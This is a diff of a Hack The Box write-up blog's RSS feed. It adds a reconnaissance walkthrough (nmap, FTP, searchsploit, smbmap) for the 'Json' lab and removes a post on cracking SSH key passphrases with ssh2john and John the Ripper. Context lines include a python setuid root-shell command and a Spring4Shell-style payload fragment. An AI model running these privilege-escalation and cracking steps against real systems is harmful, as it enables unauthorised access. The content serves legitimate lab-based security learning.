@@ -1,4 +1,150 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 28 Feb 2026 21:00:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB-Driver Writeup</title><link>https://enilmalus.github.io/posts/htb-driver-writeup/</link><pubDate>Sat, 28 Feb 2026 21:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/htb-driver-writeup/</guid><description>初始侦察 Nmap 端口扫描 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo nmap --min-rate 10000 -p- 10.129.95.238 [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 07:47 EST Nmap scan report for driver.htb (10.129.95.238) Host is up (0.093s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 445/tcp open microsoft-ds 5985/tcp open wsman Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds Nmap 详细信息扫描 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo nmap -sT -sC -sV -O -p80,135,445,5985 10.</description><content type="html"><![CDATA[<h2 id="初始侦察">初始侦察</h2>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Welcome My Hack's Blog</title><link>https://enilmalus.github.io/posts/</link><description>Recent content in Posts on Welcome My Hack's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 01 Mar 2026 14:00:00 +0800</lastBuildDate><atom:link href="https://enilmalus.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB-Json Writeup</title><link>https://enilmalus.github.io/posts/htb-json-writeup/</link><pubDate>Sun, 01 Mar 2026 14:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/htb-json-writeup/</guid><description>初始侦察 Nmap 端口扫描 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo nmap --min-rate 10000 -p- 10.129.227.191 -oA port [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 01:13 EST Nmap scan report for 10.129.227.191 Host is up (0.10s latency). Not shown: 65521 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5985/tcp open wsman 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 11.</description><content type="html"><![CDATA[<h2 id="初始侦察">初始侦察</h2>
+<h3 id="nmap-端口扫描">Nmap 端口扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.227.191 -oA port
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-03-01 01:13 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.191
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.10s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65521</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman
+</span></span><span style="display:flex;"><span>47001/tcp open  winrm
+</span></span><span style="display:flex;"><span>49152/tcp open  unknown
+</span></span><span style="display:flex;"><span>49153/tcp open  unknown
+</span></span><span style="display:flex;"><span>49154/tcp open  unknown
+</span></span><span style="display:flex;"><span>49155/tcp open  unknown
+</span></span><span style="display:flex;"><span>49156/tcp open  unknown
+</span></span><span style="display:flex;"><span>49157/tcp open  unknown
+</span></span><span style="display:flex;"><span>49158/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.14 seconds
+</span></span></code></pre></div><p>提取端口做备用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ grep open port.nmap | awk -F <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#e6db74">&#39;{print $1}&#39;</span> | paste -sd <span style="color:#e6db74">&#39;,&#39;</span>
+</span></span><span style="display:flex;"><span>21,80,135,139,445,5985,47001,49152,49153,49154,49155,49156,49157,49158
+</span></span></code></pre></div><h3 id="nmap-详细信息扫描">Nmap 详细信息扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sT -sC -sV -O -p21,80,135,139,445,5985,47001,49152,49153,49154,49155,49156,49157,49158 10.129.227.191                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-03-01 01:17 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.191
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.097s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp          FileZilla ftpd 0.9.60 beta
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|_  SYST: UNIX emulated by FileZilla
+</span></span><span style="display:flex;"><span>80/tcp    open  http         Microsoft IIS httpd 8.5
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/8.5
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-title: Json HTB
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 - <span style="color:#ae81ff">2012</span> microsoft-ds
+</span></span><span style="display:flex;"><span>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>49152/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49153/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49155/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49156/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49157/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49158/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running: Microsoft Windows <span style="color:#ae81ff">2012</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2012:r2
+</span></span><span style="display:flex;"><span>OS details: Microsoft Windows Server <span style="color:#ae81ff">2012</span> or <span style="color:#ae81ff">2012</span> R2
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OSs: Windows, Windows Server <span style="color:#ae81ff">2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:0:2: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: JSON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:8d:d4 <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2026-03-01T06:18:26
+</span></span><span style="display:flex;"><span>|_  start_date: 2026-03-01T06:05:01
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 69.77 seconds
+</span></span></code></pre></div><h3 id="nmap-漏洞脚本扫描">Nmap 漏洞脚本扫描</h3>
+<p>对 <code>hosts</code> 文件添加域解析。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo sed -i <span style="color:#e6db74">&#39;1i 10.129.227.191 json.htb&#39;</span> /etc/hosts 
+</span></span><span style="display:flex;"><span>                           
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ head -n <span style="color:#ae81ff">1</span> /etc/hosts
+</span></span><span style="display:flex;"><span>10.129.227.191 json.htb
+</span></span></code></pre></div><h2 id="21-ftp-渗透">21-ftp 渗透</h2>
+<p>Nmap 扫描出开放了 21/ftp 端口，尝试匿名登入。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ftp json.htb
+</span></span><span style="display:flex;"><span>Trying 10.129.227.191:21 ...
+</span></span><span style="display:flex;"><span>Connected to json.htb.
+</span></span><span style="display:flex;"><span>220-FileZilla Server 0.9.60 beta
+</span></span><span style="display:flex;"><span>220-written by Tim Kosse <span style="color:#f92672">(</span>tim.kosse@filezilla-project.org<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> Please visit https://filezilla-project.org/
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>json.htb:kali<span style="color:#f92672">)</span>: anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span> Password required <span style="color:#66d9ef">for</span> anonymous
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">530</span> Login or password incorrect!
+</span></span><span style="display:flex;"><span>ftp: Login failed
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">530</span> Please log in with USER and PASS first.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">530</span> Please log in with USER and PASS first.
+</span></span><span style="display:flex;"><span>ftp: Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t bind <span style="color:#66d9ef">for</span> data connection: Address already in use
+</span></span></code></pre></div><p>无法匿名登入，ftp 使用的是 <code>FileZilla</code>，搜索一下有没有公开的漏洞利用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ searchsploit FileZilla 0.9                         
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                          |  Path
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>FileZilla FTP Server 0.9.20b/0.9.21 - <span style="color:#e6db74">&#39;STOR&#39;</span> Denial of Service                                          | windows/dos/2901.php
+</span></span><span style="display:flex;"><span>FileZilla FTP Server 0.9.21 - <span style="color:#e6db74">&#39;LIST/NLST&#39;</span> Denial of Service                                             | windows/dos/2914.php
+</span></span><span style="display:flex;"><span>FileZilla Server Terminal 0.9.4d - Buffer Overflow <span style="color:#f92672">(</span>PoC<span style="color:#f92672">)</span>                                                | windows/dos/1336.cpp
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>Papers: No Results
+</span></span></code></pre></div><p>都是 Dos 漏洞，无法利用。</p>
+<h2 id="445-smb-渗透">445-Smb 渗透</h2>
+<p>使用 <code>smbmap</code> 匿名枚举失败</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbmap -H json.htb         
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>-----------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">0</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Something weird happened on <span style="color:#f92672">(</span>10.129.227.191<span style="color:#f92672">)</span> Error occurs <span style="color:#66d9ef">while</span> reading from remote<span style="color:#f92672">(</span>104<span style="color:#f92672">)</span> on line <span style="color:#ae81ff">1015</span>                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div>]]></content></item><item><title>HTB-Driver Writeup</title><link>https://enilmalus.github.io/posts/htb-driver-writeup/</link><pubDate>Sat, 28 Feb 2026 21:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/htb-driver-writeup/</guid><description>初始侦察 Nmap 端口扫描 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo nmap --min-rate 10000 -p- 10.129.95.238 [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 07:47 EST Nmap scan report for driver.htb (10.129.95.238) Host is up (0.093s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 445/tcp open microsoft-ds 5985/tcp open wsman Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds Nmap 详细信息扫描 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo nmap -sT -sC -sV -O -p80,135,445,5985 10.</description><content type="html"><![CDATA[<h2 id="初始侦察">初始侦察</h2>
 <h3 id="nmap-端口扫描">Nmap 端口扫描</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.95.238 
@@ -6636,508 +6782,7 @@ class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nathan@cap:~$ /usr/bin/python3.8 -c <span style="color:#e6db74">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
 </span></span><span style="display:flex;"><span>root@cap:~# whoami
 </span></span><span style="display:flex;"><span>root
-</span></span></code></pre></div>]]></content></item><item><title>John 工作原理分析</title><link>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</link><pubDate>Thu, 01 Jan 2026 00:40:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</guid><description>ssh2john 提取私钥 ┌──(kali㉿kali)-[~/Work/Kali] └─$ ssh2john id_rsa | tee key_hash SSH 私钥文件本身采用专门的格式储存，其中包含了加密的参数消息、加密算法以及密文数据，而不是直接的密码哈希字符串，私钥加密时会采用密钥派生函数（如 PBKDF2 或 bcrypt ）来对口令生成对称密钥，然后用该密钥对私钥数据进行加密，使得文件内容看起来像是一段难以辨别的编码数据。John 是一个专门用于破解密码哈希的工具，他需要知道加密算法的具体参数（例如加密方式、迭代次数、盐值等），才能通过暴力破解或者字典攻击验证猜测的口令是否正确。ssh2john 就是用来解析 SSH 私钥文件，提取出其中的加密参数和密文数据，构造出一个标准化的哈希格式，这种格式正式 John 能够识别并处理的。只有经过这种转换，John 才能根据已知的加密参数对猜测的口令进行验证，否则直接对原始密钥文件进行暴力破解是不现实的，因为文件格式本身并不直接暴露口令的哈希。
-John 设计的初衷在于专注于高效破解，而不是兼顾解析和转换各种格式文件。各种密钥文件和加密数据都有自己独特的储存格式、加密参数和版本演变，内置所有解析逻辑会使得核心代码变得臃肿，增加维护难度和安全风险，同时也会分散团队在算法优化和并行处理上的精力。事实上，文件格式转换本身是一项非常复杂且不断演进的工作，许多转换工具最初由社区不同专家针对各自领域开发出来，这种分工使得每个工具都可以专注于特定格式的深度解析和不断更新，而 John 的核心开发者可以集中精力提升密码破解的速度和准确性。再者，不同格式的解析逻辑通常需要对各种加密协议和密钥派生函数有精确而细致的处理，若将这些所有细节内知道主程序中，不仅会增加软件整体的复杂度，还会使得未来支持新格式的工作变得更为繁琐和风险巨大。通过采用独立的 ssh2john 攻击，整个破解流程得以模块化：用户首先通过专门的转换工具提取破解所需的关键信息，再交由 John 进行针对性暴力破解或字典攻击，这样的架构既提高了灵活性，也确保了每个环节都能在各自领域达到最佳效果。
-John 破解提取的私钥 ┌──(kali㉿kali)-[~/Work/Kali] └─$ john key_hash John the Ripper 默认会按照一套预设的攻击策略以此尝试不同的破解模式。当不指定特定模式时，John 首先启动单一模式（Single crack mode），利用哈希文件中的信息（例如用户名、文件名等）生成候选密码并进行尝试；这就是输出模式中显示 “Proceeding with single,rule:Single” 所表达的含义。单一模式通常能在很短的时间内尝试一些最可能的密码组合，当 John 发现还有缓冲的候选密码没有处理完时，它会尽快完成这部分工作。接下来，John 会自动进入下一阶段，也就是使用默认字典进行攻击。如果前面两种都没有破解成功，John 就会启动最全面但是效率较低的增量模式（Incrementak mode），即基于 ASCII 字符的穷举攻击。整个流程的设计逻辑在于先用最后可能的密码组合进行快速尝试，再逐步扩大候选密码空间，再有限的时间内尽可能高效地覆盖大部分实际使用的密码组合。
-fasttrack 字典 fasttrack.txt 时 Kali 中的一个轻量级 “常用弱口令字典” ，其优势在于体量小、命中率较高，开箱即用，但不会随着 Kali 的更新而更新。作为测试时的第一步爆破字典，它可以帮助安全人员快速验证目标是否使用了过于单一或过时的弱密码。对于需要兼顾速度与小笼包的渗透测试场景而言，先从 fasttrack.txt 入手，再逐步过渡到规模更大的字典列表是一种较为常见且易于实施的做法。</description><content type="html"><![CDATA[<h2 id="ssh2john-提取私钥">ssh2john 提取私钥</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ ssh2john id_rsa | tee key_hash
-</span></span></code></pre></div><p>SSH 私钥文件本身采用专门的格式储存，其中包含了加密的参数消息、加密算法以及密文数据，而不是直接的密码哈希字符串，私钥加密时会采用密钥派生函数（如 PBKDF2 或 bcrypt ）来对口令生成对称密钥，然后用该密钥对私钥数据进行加密，使得文件内容看起来像是一段难以辨别的编码数据。John 是一个专门用于破解密码哈希的工具，他需要知道加密算法的具体参数（例如加密方式、迭代次数、盐值等），才能通过暴力破解或者字典攻击验证猜测的口令是否正确。ssh2john 就是用来解析 SSH 私钥文件，提取出其中的加密参数和密文数据，构造出一个标准化的哈希格式，这种格式正式 John 能够识别并处理的。只有经过这种转换，John 才能根据已知的加密参数对猜测的口令进行验证，否则直接对原始密钥文件进行暴力破解是不现实的，因为文件格式本身并不直接暴露口令的哈希。</p>
-<p>John 设计的初衷在于专注于高效破解，而不是兼顾解析和转换各种格式文件。各种密钥文件和加密数据都有自己独特的储存格式、加密参数和版本演变，内置所有解析逻辑会使得核心代码变得臃肿，增加维护难度和安全风险，同时也会分散团队在算法优化和并行处理上的精力。事实上，文件格式转换本身是一项非常复杂且不断演进的工作，许多转换工具最初由社区不同专家针对各自领域开发出来，这种分工使得每个工具都可以专注于特定格式的深度解析和不断更新，而 John 的核心开发者可以集中精力提升密码破解的速度和准确性。再者，不同格式的解析逻辑通常需要对各种加密协议和密钥派生函数有精确而细致的处理，若将这些所有细节内知道主程序中，不仅会增加软件整体的复杂度，还会使得未来支持新格式的工作变得更为繁琐和风险巨大。通过采用独立的 ssh2john 攻击，整个破解流程得以模块化：用户首先通过专门的转换工具提取破解所需的关键信息，再交由 John 进行针对性暴力破解或字典攻击，这样的架构既提高了灵活性，也确保了每个环节都能在各自领域达到最佳效果。</p>
-<h2 id="john-破解提取的私钥">John 破解提取的私钥</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ john key_hash
-</span></span></code></pre></div><p>John the Ripper 默认会按照一套预设的攻击策略以此尝试不同的破解模式。当不指定特定模式时，John 首先启动单一模式（Single crack mode），利用哈希文件中的信息（例如用户名、文件名等）生成候选密码并进行尝试；这就是输出模式中显示 “Proceeding with single,rule:Single” 所表达的含义。单一模式通常能在很短的时间内尝试一些最可能的密码组合，当 John 发现还有缓冲的候选密码没有处理完时，它会尽快完成这部分工作。接下来，John 会自动进入下一阶段，也就是使用默认字典进行攻击。如果前面两种都没有破解成功，John 就会启动最全面但是效率较低的增量模式（Incrementak mode），即基于 ASCII 字符的穷举攻击。整个流程的设计逻辑在于先用最后可能的密码组合进行快速尝试，再逐步扩大候选密码空间，再有限的时间内尽可能高效地覆盖大部分实际使用的密码组合。</p>
-<h3 id="fasttrack-字典">fasttrack 字典</h3>
-<p>fasttrack.txt 时 Kali 中的一个轻量级 “常用弱口令字典” ，其优势在于体量小、命中率较高，开箱即用，但不会随着 Kali 的更新而更新。作为测试时的第一步爆破字典，它可以帮助安全人员快速验证目标是否使用了过于单一或过时的弱密码。对于需要兼顾速度与小笼包的渗透测试场景而言，先从 fasttrack.txt 入手，再逐步过渡到规模更大的字典列表是一种较为常见且易于实施的做法。</p>
